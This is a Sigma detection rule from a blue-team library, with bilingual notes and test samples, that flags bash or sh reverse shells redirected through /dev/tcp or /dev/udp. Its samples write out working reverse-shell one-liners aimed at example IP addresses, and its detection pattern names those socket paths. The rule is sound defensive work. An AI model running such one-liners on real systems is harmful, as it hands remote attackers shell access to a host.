---
title: Reverse Shell Via Bash /dev/tcp Redirection
summary: |-
  Detects a shell started with a command line that redirects its input/output to a /dev/tcp or /dev/udp socket, the classic one-line reverse shell.
  It usually follows remote code execution in a web application or a container.
sigma_id: b686847e-ec30-4d68-a38a-d5d01093f6a8
status: experimental
level: high
platform: linux
logsource: linux / process_creation
tactics:
  - TA0002
techniques:
  - T1059.004
author: FLAMINGOFF
date: '2026-11-27'
falsepositives:
  - Health-check scripts that use /dev/tcp and also redirect stderr (review and exclude by parent process)
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://www.gnu.org/software/bash/manual/html_node/Redirections.html
source:
  name: Blue Team Library
  url: https://github.com/FLAMINGOFF/blueteam-library/blob/main/src/content/rules/btl_lnx_shell_dev_tcp_reverse_shell.md
  license: Original
format: Sigma
original: true
title_zh: 通过 bash /dev/tcp 重定向建立反弹 Shell
summary_zh: 检测启动 Shell 时把输入输出重定向到 /dev/tcp 或 /dev/udp 套接字的命令行，也就是经典的一行反弹 Shell。通常出现在 Web 应用或容器被远程代码执行之后。
notes_zh: 数据源可以是 auditd execve 或 EDR 的进程事件。父进程是 Web 服务（nginx、java、node、php-fpm）时基本可以直接确认。
notes_en: Works with auditd execve or EDR process events. When the parent is a web service (nginx, java, node, php-fpm) it is almost always a true positive.
samples:
  - name:
      zh: Web 进程派生的反弹 Shell
      en: Reverse shell spawned by a web process
    expect: true
    event:
      Image: /usr/bin/bash
      CommandLine: bash -c bash -i >& /dev/tcp/203.0.113.66/4444 0>&1
      ParentImage: /usr/local/bin/node
      User: www-data
  - name:
      zh: sh 通过 UDP
      en: sh over UDP
    expect: true
    event:
      Image: /bin/sh
      CommandLine: sh -i >& /dev/udp/198.51.100.9/53 0>&1
  - name:
      zh: 端口探测脚本（不重定向 Shell）
      en: Port check without redirecting the shell
    expect: false
    event:
      Image: /usr/bin/bash
      CommandLine: bash -c "echo > /dev/tcp/db.internal/5432" && echo up
      ParentImage: /usr/sbin/cron
---

```yaml
title: Reverse Shell Via Bash /dev/tcp Redirection
id: b686847e-ec30-4d68-a38a-d5d01093f6a8
status: experimental
description: |
  Detects a shell started with a command line that redirects its input/output to a /dev/tcp or /dev/udp socket, the classic one-line reverse shell.
  It usually follows remote code execution in a web application or a container.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://www.gnu.org/software/bash/manual/html_node/Redirections.html
author: FLAMINGOFF
date: 2026-11-27
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection_img:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/zsh'
      - '/ksh'
  selection_socket:
    CommandLine|contains:
      - '/dev/tcp/'
      - '/dev/udp/'
  selection_redirect:
    CommandLine|contains:
      - '>&'
      - '<&'
  condition: all of selection_*
falsepositives:
  - Health-check scripts that use /dev/tcp and also redirect stderr (review and exclude by parent process)
level: high
```
